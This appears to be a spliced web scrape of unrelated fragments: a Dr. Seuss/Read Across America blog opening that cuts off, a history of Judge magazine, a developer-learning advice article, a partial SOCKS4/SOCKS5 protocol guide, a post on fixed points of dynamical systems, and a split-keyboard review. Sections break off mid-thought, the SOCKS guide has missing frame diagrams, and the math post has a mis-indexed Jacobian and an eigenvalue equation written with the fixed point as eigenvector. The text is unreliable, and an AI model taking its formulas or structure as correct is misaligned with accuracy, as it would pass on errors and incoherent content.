<p><br>Today marks the 20th Anniversary of the National Education Association’s (NEA) “Read Across America” Day — an event observed every year on Dr. Seuss’s birthday. It is the largest celebration of reading in America, with over 45 million students, parents, teachers, libraries and community centers participating. Dr. Seuss books and activities are central to the annual celebration — schools have Dr. Seuss-themed festivals, eat “green eggs and ham”, and get dressed up as their “favorite Dr. Seuss character”. The NEA sells Dr. Seuss merchandise through their <a href="http://www.raastore.com/site/" target="_blank"><em>website</em></a>, and kids across America will be seen wearing the <a href="http://www.readacrossamerica.org/pledges/" target="_blank"><em>red and white striped hats</em></a> from the book, The Cat in the Hat.</p>
<p>Theodor Seuss Geisel, aka “Dr. Seuss,” has sold over 600 million copies of his books and is a widely celebrated and beloved children’s book author. Most people in America, and even globally (Dr. Seuss books are translated into 20 languages), know of his classic titles. What it not as well known (or acknowledged), is his work publishing racist and xenophobic political cartoons.<br>
</p>








<hr>

<p><br>It was launched by artists who had seceded from its rival Puck. The founders included cartoonist James Albert Wales, dime novels publisher Frank Tousey and author George H. Jessop.</p>
<p>The first printing of Judge was on October 29, 1881, during the Long Depression. It was 16 pages long and printed on quarto paper. While it did well initially, it soon had trouble competing with Puck. William J. Arkell purchased the magazine in the middle 1880s. Arkell used his considerable wealth to persuade the cartoonistss Eugene Zimmerman (“Zim”) and Bernard Gillam to leave Puck. A supporter of the Republican Party, Arkell persuaded his cartoonists to attack the Democratic administration of Grover Cleveland. With G.O.P. aid, Judge boomed during the ’80s and ’90s, surpassing its rival publication in content and circulation. By the early 1890s, the circulation of the magazine reached 50,000.</p>
<p>Under the editorial leadership of Isaac Gregory, 1886–1901, Judge allied with the Republican Party and supported the candidacy of William McKinley largely through the cartoons of leading cartoonist Grant E. Hamilton. Circulation for Judge was about 85,000 in the 1890s. By the 1900s, the magazine had become successful, reaching a circulation of 100,000 by 1912.

They are not optional extras but are vital to the successful achievement of their career goals. However, there are some common learning mistakes that developers often make regardless of where they are currently in their careers.</p><p id="ed23">The common learning mistakes are:</p><ol><li id="bcd6">Not having a learning plan.</li><li id="cb91">Not setting a clear end goal.</li><li id="fd0d">Choosing too broad a topic.</li><li id="406e">Having a consumption overload.</li><li id="ffb4">Not keeping track of progress.</li></ol></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of person on laptop" src="https://miro.medium.com/max/11520/0*ZdqNg4jjyniaoCe2" width="5760" height="3840" srcset="https://miro.medium.com/max/552/0*ZdqNg4jjyniaoCe2 276w, https://miro.medium.com/max/1104/0*ZdqNg4jjyniaoCe2 552w, https://miro.medium.com/max/1280/0*ZdqNg4jjyniaoCe2 640w, https://miro.medium.com/max/1400/0*ZdqNg4jjyniaoCe2 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ZdqNg4jjyniaoCe2?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@chuklanov?utm_source=medium&amp;utm_medium=referral" rel="noopener">Avel Chuklanov</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="7042">There is a saying that if you fail to plan, you plan to fail, and this applies to learning too. Sometimes, developers get impatient and plunge straight into active learning without any preparation. For example, a developer might say they want to learn a JavaScript framework, React. They may start reading tutorials about React without any outline on what areas they want to focus on, or how to get to their end goal: being able to write React applications.</p><p id="6916">The better way of learning, in this case, will be looking at the official documentation, going through the step-by-step approach from main concepts to advanced guides and API references, and creating a sample application in React. After this, looking at and learning from other examples out there and setting SMART goals for each stage of their learning will be helpful. S.M.A.R.T. goals are good goals because they’re specific, measurable, achievable, realistic, and time-bound.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of a bullseye" src="https://miro.medium.com/max/10336/0*ycA_TuwSGX-DwcOr" width="5168" height="3448" srcset="https://miro.medium.com/max/552/0*ycA_TuwSGX-DwcOr 276w, https://miro.medium.com/max/1104/0*ycA_TuwSGX-DwcOr 552w, https://miro.medium.com/max/1280/0*ycA_TuwSGX-DwcOr 640w, https://miro.medium.com/max/1400/0*ycA_TuwSGX-DwcOr 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ycA_TuwSGX-DwcOr?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@enginakyurt?utm_source=medium&amp;utm_medium=referral" rel="noopener">engin akyurt</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="1985">There are so many new technologies and new ways of doing things in the <a href="https://hackernoon.com/tagged/software-development" rel="noopener">software development</a> industry. Don’t get me wrong; I believe continuous learning is a good thing. You can only grow your skill set and knowledge if you are open to learning. However, if a developer has too much FOMO (Fear of Missing Out) about learning every new thing that they hear about — then there will be no time left for being productive or putting her knowledge and skills to good use.</p><p id="bcfd">Before you learn something, I’d encourage you to think about why you’re learning it — and where and how you’ll use your newly learned knowledge or skill. For example, if you’re a backend developer, and you’re learning JavaScript, you’re doing so because your goal is to move to full-stack development. Or, if you’re a DevOps and learning AWS, you might be doing so to increase your chance of a new employment opportunity at a company that uses AWS.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of the sea and sky." src="https://miro.medium.com/max/12408/0*bfFnMGfMLjIakmKq" width="6204" height="4136" srcset="https://miro.medium.com/max/552/0*bfFnMGfMLjIakmKq 276w, https://miro.medium.com/max/1104/0*bfFnMGfMLjIakmKq 552w, https://miro.medium.com/max/1280/0*bfFnMGfMLjIakmKq 640w, https://miro.medium.com/max/1400/0*bfFnMGfMLjIakmKq 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*bfFnMGfMLjIakmKq?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mattmaber?utm_source=medium&amp;utm_medium=referral" rel="noopener">Matthew Maber</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="aa08">Ever heard of the saying — everything but the kitchen sink? Sometimes, developers get too greedy with wanting to know everything about a topic that they fail to narrow down and, instead, set a very broad learning objective. How broad is too broad, I hear you ask. In my opinion, a topic is too broad if you can’t articulate your learning outcomes in a few words to another developer.</p><p id="6bd4">Learning outcomes are statements about knowledge or skill a developer should acquire by the end of their learning journey on a specific topic. Sure, you can learn about a particular topic forever, but there must be a point when you decide for yourself that it is enough, for now. Enough for you to feel confident in working toward and achieving your end goal.</p><p id="dc7e">For example, here are some learning outcomes for learning React Javascript framework.</p><p id="b7ae">By the end of my learning program, I should be able to create a new React app from scratch that can:</p><ul><li id="db4c">Consume JSON payload in a REST API</li><li id="54a3">Refresh the content of the app every <code>x</code> mins</li><li id="d377">Navigate to different screens</li><li id="2fa8">Remember the last screen I visited before (if any)</li><li id="24ff">Be Unit-tested</li></ul><p id="6ee5">Note that the above learning outcomes are not too specific or detailed (like creating a component in JSX syntax, for example) because you don’t know about the ins and outs of the React framework yet. They are not too broad either; there is a clear outcome for each statement instead of just a broad, generic one, like “Create a React app.”</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of multiple waterfalls" src="https://miro.medium.com/max/9216/0*YWDZfhREIQqoJ_fy" width="4608" height="3008" srcset="https://miro.medium.com/max/552/0*YWDZfhREIQqoJ_fy 276w, https://miro.medium.com/max/1104/0*YWDZfhREIQqoJ_fy 552w, https://miro.medium.com/max/1280/0*YWDZfhREIQqoJ_fy 640w, https://miro.medium.com/max/1400/0*YWDZfhREIQqoJ_fy 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*YWDZfhREIQqoJ_fy?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mikeanywhere?utm_source=medium&amp;utm_medium=referral" rel="noopener">Mike Lewis HeadSmart Media</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="c174">Tutorial fatigue — it’s real. If you think you’re learning something by going through endless books, videos, and tutorials then you’re simply wasting your time. Pick a few options, be it books, videos, or any other format, and stick with them. Chances are what you learn in a video will be very similar to another tutorial that you’re reading on the same topic.</p><p id="7c5d">To give you another example, I did a quick search on Amazon about React Javascript framework, and there were about 700 books on the topic — a few of them even have the exact same book title, <em>Learning React</em>. There is no way you can get through all the books, and even if you did, it is no guarantee that you’ll become an expert at React, or is it a good use of your time.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of a loading screen" src="https://miro.medium.com/max/12096/0*5fuYpC-mFVleIePR" width="6048" height="4024" srcset="https://miro.medium.com/max/552/0*5fuYpC-mFVleIePR 276w, https://miro.medium.com/max/1104/0*5fuYpC-mFVleIePR 552w, https://miro.medium.com/max/1280/0*5fuYpC-mFVleIePR 640w, https://miro.medium.com/max/1400/0*5fuYpC-mFVleIePR 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*5fuYpC-mFVleIePR?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mike_van_den_bos?utm_source=medium&amp;utm_medium=referral" rel="noopener">Mike van den Bos</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="a189">Having a clear plan and a definite goal is good, but they serve little purpose if you’re not keeping track of how you’re progressing — and if you’re reaching your goals. Review your progress every fortnight, or at least every month, and ask yourself whether you are heading in the right direction.</p><p id="568e">I recommend setting up a reminder in your calendar to review your progress at a regular interval at the start of your learning journey — so you don’t forget about it. If you’re not achieving your goals timely, it’s a chance for you to understand where you may be struggling with and revise your plan. On the other hand, if you’re achieving your goals, celebrate them to keep your momentum and motivation going.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of an apple, some book, crayons" src="https://miro.medium.com/max/7906/0*WItSN7T0lYfj_6P1" width="3953" height="2791" srcset="https://miro.medium.com/max/552/0*WItSN7T0lYfj_6P1 276w, https://miro.medium.com/max/1104/0*WItSN7T0lYfj_6P1 552w, https://miro.medium.com/max/1280/0*WItSN7T0lYfj_6P1 640w, https://miro.medium.com/max/1400/0*WItSN7T0lYfj_6P1 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*WItSN7T0lYfj_6P1?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@element5digital?utm_source=medium&amp;utm_medium=referral" rel="noopener">Element5 Digital</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="1ed7">In this day and age, being an efficient learner gives you an edge and sets you up for your career success. I’m a firm believer that you can get better at anything in life if you take the time to understand the process — and have the willingness to improve. Learning is no exception. It is a skill that can be improved with practice. And knowing what not to do is sometimes as important as knowing what to do when it comes to learning.

<![CDATA[Implementer's Guide to Socks (Protocol)]]>

March 4, 2021 | https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html | <a href="https://web.archive.org/web/*/https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
				<p>
	Yesterday I was verifying that the SOCKS test suite of 
	 <a href="https://github.com/tholian-network/stealth">Tholian Stealth</a> 
	is working and I realized that writing failsafe tests are not
	as easy as someone might think. So here's my write-up about
	the SOCKS protocol.
</p>
<p>
	The problem with SOCKS in a nutshell is that it is not as well
	documented as someone might think.
</p>
<p>
	Most people are even unaware of the role that a SOCKS proxy plays
	in between network connections and therefore don't know what exactly
	a SOCKS proxy can or cannot do in regards to blocking ads and malicious
	domains.
</p>
<p>
	So I thought that a reference-class article for SOCKS4 and SOCKS5
	would be nice, documenting its quirks and common pitfalls while
	implementing those protocols.
</p>
<p>
	For the implementation we're going to build in this article,
	we only need plain node.js and its 
	 <code>net</code>
	 core stack. The
	implementation will be peer-to-peer, which means it can be used
	for both the client-side and server-side whereas both sides are
	implemented in node.js for the sake of simplicity.
</p>
<h2>Introduction</h2>
<p>
	First off, you have to know that the 
	 <code>SOCKS</code>
	 protocol is specified as
	 <a href="https://tools.ietf.org/html/rfc1928">RFC1928</a> 
	 and
	 <a href="https://tools.ietf.org/html/rfc1929">RFC1929</a> 
	 and didn't change since
	 <code>1996</code>
	 so it's somewhat safe to assume that this is the final version
	of the network protocol.
</p>
<p>
	The SOCKS protocol in general and its role is pretty much what telephone
	operators did in the past. A client connects to the SOCKS proxy and
	requests to connect to a specific target. The proxy tries to connect
	to the target, and if it succeeds reaches through the connection to the
	client.
</p>
<pre>Client: Please let me connect to IP 1.2.3.4.
Proxy:  Trying to connect... please hold the line ...
Proxy:  Here's the connection handle, any further data will be dispatched through automatically.
</pre>
<pre>Client: Please let me connect to IP 1.2.3.4.
Proxy:  Trying to connect... please hold the line ...
Proxy:  Sorry, the given target is not reachable. Please try again later.
Proxy:  *hangs off the phone* Beep Beep Beep.
</pre>
<p>
	As both 
	 <code>SOCKS4</code>
	 and 
	 <code>SOCKS4a</code>
	 were proprietary protocols, they didn't
	have any RFC. 
	 <code>SOCKS5</code>
	 is referring a lot the 
	 <code>SOCKS4</code>
	 protocol and
	its featureset, so reading the RFC is quite complicated if you don't
	know what the older protocol versions actually did feature-wise.
</p>
<p>
	Usually though, most clients and servers that claim to support SOCKS5
	actually only support the 
	 <code>user</code>
	 and 
	 <code>password</code>
	 authentication, not
	the 
	 <code>IPv6</code>
	 or 
	 <code>DNS/UDP</code>
	 related features that come with it.
</p>
<p>
	This implementation will focus mostly on the 
	 <code>IPv4</code>
	 and 
	 <code>IPv6</code>
	differences and will - for the sake of simplicity - only support 
	 <code>TCP</code>
	based connections.
</p>
<p>
	The 
	 <code>SOCKS4</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP)</li>
</ul>
<p>
	The 
	 <code>SOCKS4a</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP)</li>
	<li>connects to <code>domain</code> (TCP)</li>
	<li>authentication via <code>user</code> is broken in practice (no password)</li>
</ul>
<p>
	The 
	 <code>SOCKS5</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP and UDP)</li>
	<li>connects to <code>IPv6</code> (TCP and UDP)</li>
	<li>connects to <code>domain</code> (TCP)</li>
	<li>authentication via <code>user</code> and <code>password</code></li>
</ul>
<h2>SOCKS Protocol and Network States</h2>
<p>
	Describing SOCKS data frames can be kind of complicated, because the
	interpretation of a SOCKS frame is different depending on its network
	state. So I'm trying to document the different network states first,
	so that you know what kind of states on both sides are possible.
</p>
<p>
	We are also going to completely ignore the 
	 <code>SOCKS authentication methods</code>

<h3>SOCKS Version 4</h3>
<p>
	The SOCKS 
	 <b>Version 4</b>
	 network flow looks like this
	:
</p>
<ul>
	<li>Client sends Connection Request Frame</li>
	<li>Server responds with a Status Frame</li>
</ul>
<p>... and that's pretty much it. Super simple.</p>
<p>
	 <b>SOCKS Version 4 Connection Request Frame</b>
	:
</p>
<pre>+---------+---------+----+----+----+----+----+----+----+----+....+----+
| VERSION | COMMAND | DSTPORT |      DSTIP        | USERID       |NULL|
+---------+---------+----+----+----+----+----+----+----+----+....+----+
     1         1         2              4           variable       1
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which can be either of <code>0x04</code> or <code>0x05</code> .</li>
	<li><code>COMMAND</code> (1 byte) represents the <code>SOCKS command</code> , which can be either of the Commands explained below.</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>1</code> to <code>65535</code> .</li>
	<li><code>DSTIP</code> is an <code>IPv4</code> (4 bytes) represents the destination IP, and encodes 4 digits as <code>0x00</code> to <code>0xFF</code> respectively.</li>
	<li><code>USERID</code> (variable byte length, followed by a <code>NULL</code> terminator byte) represents an authentication mechanism for a user-login; but without a password.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Commands</b>
	:
</p>
<ul>
	<li><code>0x01</code> represents <code>CONNECT</code> and is a TCP/IP connection request which lets the Server established the connection.</li>
	<li><code>0x02</code> represents <code>BIND</code> and is a TCP/IP port binding to allow the Client to establish the connection themselves.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Connection Status Frame</b>
	:
</p>
<pre>+---------+--------+----+----+----+----+----+----+
| VERSION | STATUS | DSTPORT |      DSTIP        |
+---------+--------+----+----+----+----+----+----+
     1         1        2              4
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which can be either of <code>0x04</code> or <code>0x05</code> .</li>
	<li><code>STATUS</code> (1 byte) represents the <code>SOCKS status</code> , which can be either of the Status explained below.</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>1</code> to <code>65535</code> .</li>
	<li><code>DSTIP</code> is an <code>IPv4</code> (4 bytes) represents the destination IP, and encodes 4 digits as <code>0x00</code> to <code>0xFF</code> respectively.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Status Codes</b>
	:
</p>
<ul>
	<li><code>0x5A</code> Request granted.</li>
	<li><code>0x5B</code> Request rejected or failed.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Status Codes for Authentication Mechanism</b>
	:
</p>
<p>(I would not recommend to implement them)</p>
<ul>
	<li><code>0x5C</code> Request failed because Client's <code>identd</code> is not reachable from server.</li>
	<li><code>0x5D</code> Request failed because Client's <code>identd</code> could not confirm the User ID.</li>
</ul>
<h3>SOCKS Version 5</h3>
<p>
	 <b>Important</b>
	:
	 The SOCKS Version 5 protocol is different in
	its network flow and data frame structure; and it has a
	reserved byte with a 
	 <code>0x00</code>
	 value where the SOCKS Version 4
	protocol would otherwise expect a non-NULL byte data.
</p>
<p>
	Additionally, the order of 
	 <code>Destination Port</code>
	 and 
	 <code>Destination Address</code>
	is different from the order specified in SOCKS Version 4.
</p>
<p>
	The SOCKS 
	 <b>Version 5</b>
	 network flow looks like this
	:
</p>
<ol>
	<li>Client and Server authenticate via handshake mechanism.</li>
	<li>Server authenticates or responds with error message.</li>
	<li>Client requests to connect or bind to an IPv4, IPv6 or domain.</li>
	<li>Server responds with connection status.</li>
</ol>
<p>
	 <b>SOCKS Version 5 Handshake Request Frame</b>

</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which is <code>0x05</code> .</li>
	<li><code>NMETHODS</code> (1 byte) represents the byte length of the following encoded <code>METHOD</code> s.</li>
	<li><code>METHODS</code> (variable byte length) represents the encoded SOCKS methods.</li>
</ul>
<p>
	 <b>SOCKS Version 5 Handshake Methods</b>
	:
</p>
<ul>
	<li><code>0x00</code> represents No Authentication required.</li>
	<li><code>0x01</code> represents <code>GSSAPI</code> which is a "secure" context as defined per <a href="https://tools.ietf.org/html/rfc1961">RFC1961</a> .</li>
	<li><code>0x02</code> represents <code>username/password</code> plaintext authentication.</li>
	<li><code>0x80</code> to <code>0xFE</code> are reserved for private methods, but are never used in practice.</li>
	<li><code>0xFF</code> represents No Acceptable methods (in a response).</li>
</ul>
<p>
	 <b>SOCKS Version 5 Connection Request</b>
	:
</p>
<p>
	After the Client and Server have negotiated an Authentication Method,
	the Client sends a Connection Request Frame to the Server.

In this post, I will discuss fixed points for a general case of a continuous-time $n$-dimensional system.</p><h4 id="fixed-point">Fixed point</h4><p>Just to reiterate, if the ordinary differential equation (ODE) in $\eqref{eq:1}$ represents a dynamical system:</p>\[\dot x = f(x) \label{eq:1}\]<p>Fixed points of this system are given by the roots of the equation $\eqref{eq:2}$:</p>\[\begin{equation} \dot x = f(x) = 0 \label{eq:2} \end{equation}\]<h2 id="fixed-points-of-multi-dimensional-system">Fixed points of Multi-dimensional system</h2><p>My <a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">previous post</a> only explained the definition of fixed point and provided an example with a scalar-valued dynamical system. Now, lets discuss a case of multi-dimensional ODE.</p><p>We will start with the system given by equation $\eqref{eq:3}$:</p>\[\mathbf{\dot x} = \mathbf{f(x)} \label{eq:3}\]<p>where $\mathbf{f}$ is a vector-valued function, $\mathbf{x}$ and $\mathbf{\dot x}$ are $n$-dimensional vectors:</p>\[\mathbf{x, \dot x} \in \mathcal{R}^{n} \label{eq:4}\]<p>We find the fixed points (a.k.a. equilibrium states) of the system by following $\eqref{eq:2}$:</p>\[\mathbf{\dot x_{eq}} = \mathbf{f}(\mathbf{x_{eq}}) = \mathbf{0} \label{eq:5}\]<p>The roots of $\eqref{eq:5}$ will give us the value of $\mathbf{x_{eq}}$, i.e., fixed points of our multi-dimensional system.</p><h2 id="stable-and-unstable-fixed-points">Stable and Unstable Fixed Points</h2><p>We analyzed the system in a one-dimensional case (<a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">here</a>) using a small perturbation $\delta$ at the equilibrium condition of the system. We will follow the similar procedure here as well.</p><p>We evaluated $\mathbf{f}^{\prime}\mathbf{(x)}$ at $\mathbf{x_{eq}}$ to see if our fixed point is stable or unstable. In case of one-dimensional system, it was easy since $f^{\prime}(x_{eq})&gt;0$ is unstable fixed point $x_{eq}$ while it is stable when $f^{\prime}(x_{eq})&lt;0$. In case of high-dimensional system, we cannot do this.</p><p>To analyze the behavior of our $n$-dimensional system at $\mathbf{x_{eq}}$, we will introduce the perturbation $\mathbf{\delta x}$ at $\mathbf{x_{eq}}$. Thus, we end up with the following:</p>\[\begin{align} \mathbf{\dot x_{eq} + \dot {\delta x}} &amp;= \mathbf{f(x_{eq}+\delta x)} \label{eq:6} \end{align}\]<p>Using Taylor expansion on $\eqref{eq:6}$:</p>\[\begin{align} \mathbf{\dot x_{eq} + \delta \dot x = f(x_{eq}) + f^{\prime}(x_{eq}) \delta x + f^{\prime \prime}(x_{eq}) \frac{\delta x^2}{2!} + \dots} \label{eq:7} \end{align}\]<p>But, we know at fixed points, equation $\eqref{eq:5}$ holds and thus, $\eqref{eq:7}$ reduces to $\eqref{eq:8}$.</p>\[\begin{align} \mathbf{ \delta \dot x = f^{\prime}(x_{eq}) \delta x + f^{\prime\prime}(x_{eq}) \frac{\delta x^2}{2!} + \dots} \end{align}\] \[\mathbf{ \delta \dot x = f^{\prime}(x_{eq}) \delta x + H.O.T. \label{eq:8}}\]<p>We can ignore the higher order terms $\mathbf{H.O.T.}$ for values of $\mathbf{\delta{x}}$ close to $\mathbf{0}$, resulting in equation $\eqref{eq:9}$.</p>\[\begin{align} \mathbf{\delta \dot x = f^{\prime}(x_{eq}) \delta x \label{eq:9}} \end{align}\]<p>$\mathbf{f}^{\prime}\mathbf{(x)}$ is the Jacobian of $\mathbf{f(x)}$ at $\mathbf{x_{eq}}$, i.e., a <strong>linear approximation</strong> of our dynamical system $\mathbf{f(x)}$ near $\mathbf{x_{eq}}$ (you can refer <a href="https://adipandas.github.io/posts/2020/03/vector-calculus/#jacobian-aka-derivative-of-vector-valued-function">this</a> for further details on Jacobian).</p>\[\begin{align} \mathbf{f}^{\prime}\mathbf{(x)} &amp;= \left[ \frac{\partial\mathbf{f}}{\partial x_{1}}, \frac{\partial\mathbf{f}}{\partial x_{2}}, \dots, \frac{\partial\mathbf{f}}{\partial x_{n}} \right] \label{eq:11}\\ \mathbf{f}^{\prime}\mathbf{(x)} &amp;= \begin{bmatrix} \frac{\partial{f_{1}}}{\partial x_{1}} &amp; \frac{\partial{f_{2}}}{\partial x_{2}} &amp; \dots &amp; \frac{\partial{f_{n}}}{\partial x_{n}}\\ \vdots &amp; \ddots &amp; \ddots &amp; \vdots \\ \frac{\partial{f_{n}}}{\partial x_{1}} &amp; \frac{\partial{f_{n}}}{\partial x_{2}} &amp; \dots &amp; \frac{\partial{f_{n}}}{\partial x_{n}}\\ \end{bmatrix} \label{eq:12} \end{align}\]<p>Using this Jacobian, equation $\eqref{eq:12}$, at our fixed point $\mathbf{x_{eq}}$ for the dynamical system under consideration, we can calculate its <a href="https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors"><strong>eigenvalues</strong></a> and interpret the results of the fixed point.</p><p>Therefore, we find the eigenvalues for equation $\eqref{eq:13}$,</p>\[\begin{align} \mathbf{f}^{\prime}(\mathbf{x_{eq}}) \mathbf{x_{eq}} = \lambda \mathbf{x_{eq}} \label{eq:13} \end{align}\]<p>Here, $\lambda$ denotes the eigenvalue of the system. The roots of $\eqref{eq:13}$ are the eigenvalues the dynamical system at the fixed point $\mathbf{x}=\mathbf{x_{eq}}$.</p><h3 id="eigenvalue-interpretation-">Eigenvalue interpretation <a name="eigen_value_interpretation"></a></h3><p>For a continuous-time nonlinear dynamical system given by $\eqref{eq:3}$, the eigenvalues $\lambda$ that are found as roots of equation $\eqref{eq:13}$ can be interpreted as:</p><ul><li>If any of the eigenvalues have a real part $Re(\lambda)&gt;0$: $\mathbf{x_{eq}}$ is an unstable fixed point.</li><li>If all $Re(\lambda)&lt;0$: $\mathbf{x_{eq}}$ is a stable fixed point.</li><li>If $\lambda=0$: $\mathbf{x_{eq}}$ is a neutral fixed point.</li><li>If eigenvalues $\lambda$ are complex conjugates, i.e., $Im(\lambda) \ne 0$: The dynamical system has oscillatory behavior around the fixed point.</li></ul><h3 id="important-points-to-note-regarding-this-article">Important points to note regarding this article</h3><p>In this post, we discussed a general case of interpreting the fixed points of a dynamical system. By general, I mean $\mathbf{f(x)}$ is a non-linear, continuous-time vector-valued function representing a dynamical system. Below are certain points one should note about any non-linear dynamical system:</p><ul><li>We assumed that the system is non-linear and linearized it using Taylor series expansion near its fixed point (a.k.a. equilibrium).</li><li>We evaluated the stability of a fixed point <strong>near</strong> the equilibrium condition by perturbing the system ($\mathbf{x_{eq}}+\mathbf{\delta x}$).</li><li>This approach of interpreting the stability of the system by linearizing it near the equilibrium <strong>does not tell much</strong> about a system’s asymptotic behavior at large.<ul><li>We only understand how the system behaves <strong>locally</strong> or <strong>in the neighborhood of the fixed points</strong>.</li></ul></li><li>In practical or real-world systems, it may not be possible to interpret the global stability characteristics of the system. Thus, the stability analysis around the neighborhood of the fixed point is useful for many practical applications such as sustaining a non-linear system’s state near or at the fixed point.</li><li>In general, global asymptotic behaviors of any non-linear dynamical system can be complex and there are no systematic methods to predict and analyze such behaviors.</li></ul><h3 id="references-and-further-readings">References and Further Readings:</h3><ul><li>Deshpande, A.

    <div>
      <p>In December of 2018 I finally received my UHK after months of waiting.</p>

<p>After using it daily since, I’m 100% convinced that the UHK is worth the asking price, probably more, and I’m happy that I got it at an early adopter discount.</p>

<p>Currently at $275 USD it’s definitely priced like the split ergonomic keyboard that it is, but what I think makes this one worth that is the open source, hackable nature of the keyboard.</p>

<p>Here’s my thoughts after using it as my daily driver for many months,</p>



<p>At first, I wasn’t a complete believer in Kailh keyswitches, but they’ve held up very well and show no signs of losing their feel. Still prefer Cherry for the desktop fullsize keyboards at home, but on the go and around school I’ve still had a good experience with these switches.</p>

<p>For some reason, they offered Cherry Clear and Cherry Green, no other Browns besides Kailh. Since I was planning on using this board to take notes in class, low noise was a high priority.</p>

<p>After a month or two, the switches were still a bit loud to use for notes in quiet lectures, so I bought and installed some generic o-rings which helped to reduce the keycap to board noise, but the springback action was still tell-tale sound of a mechanical keyboard.</p>

<p>Overall the feel of of the keyboard has been excellent and there’s been no hunting for keys as everything is exactly where I expect it to be.</p>



<p>The #1 eye-catching feature is for sure the splitting action.</p>

<p>I pull it out of a carrying case in one piece, and it looks whole, then it “appears I just rip my keyboard in half” as one fellow student commented.</p>

<p>But the aesthetics of the keyboard are nothing compared to how much better my carpal tunnel syndrome improved since using the UHK in place of my laptop keyboard. In fact, the primary reason I bought the UHK was to deal with carpal tunnel and I’m impressed how I’ve recovered without losing any real productivity.</p>

<p>I suspect the largest contributing factor to my development of CT was the usage of the trackpad on my laptop. Having to twist my hand and finger to move from keyboard use to having my thumb at the nearest edge of the laptop for pressing mouse buttons was likely the repetitive strain that triggered it.</p>

<p>While split, I never need to move my wrists, instead, I move the keyboard so that it’s exactly where my hands want to rest naturally. Problem solved.</p>



<p><img src="https://unhexium.net/images/uhk/desk1cut.jpg" alt=""></p>

<p>While splitting is certainly the most eye-catching features of the UHK, the LED display and steel plate construction also make it look (and feel) very premium.</p>

<p>You can of course order different colors of cases, mine being red, but the option exists such that I could easily grab a second case and customize it with paint or other mods.</p>

<p>In the future I will likely switch out the cable and keycaps to suit whatever design preferences I might have accumulated then.</p>



<p>In the first month of usage I had to change the ordering of the bottom modifier keys in order to reduce the reach strain from my most common shortcuts, I currently have them laid out as:</p>

<div><div><pre><code>Ctrl Super Fn Alt Mod || Space Super Alt Fn Ctrl
</code></pre></div></div>

<p>The goal here was to keep Super close to the right thumb and Alt close to the left thumb, because <code>Super-</code> is my window management base on Pop_OS! and Alt is used for switching terminal panes (where the right hand applies arrow keys I/HJKL) and managing textual multi-cursor.</p>

<p>It was super easy to just pop the keys off, rearrange, and reconfigure in UHK Agent.</p>

<p>I doubt I’m in the majority here, but when I touch type I used to hit the <code>Y</code> key with my left hand, since the UHK though it’s forced me to fix that habit and use the closer hand.</p>



<p>Currently my biggest gripe out of the whole experience is the mini USB connector method.</p>

<p>The connector itself is better than micro USB, but the placement of the connector underneath the top flange should have a better method of securing it instead of a simple cable pinch hole. The cable almost never stays stuck in the hole and often just causes more stress as a bend point.</p>

<p>I would love a switch to type-C with a latch mechanism, or even just keeping the connector outward facing like the RJ11 bridge would be fine.</p>

<p>After the connector, my only other problem is that the bridge cable gets squished whenever I place the keyboard inside a sleeve. I can’t immediately come up with a solution for this, since the extra slack in the already curled cable is definitely needed, but you should note to buy a case with a little more room vertically if you don’t want a squished looking bridge cable.</p>

<p><em>Machine learning has emerged as a must-have tool for any serious data team: augmenting processes, generating smarter and more accurate predictions, and generally improving our ability to make use of data.</em></p>



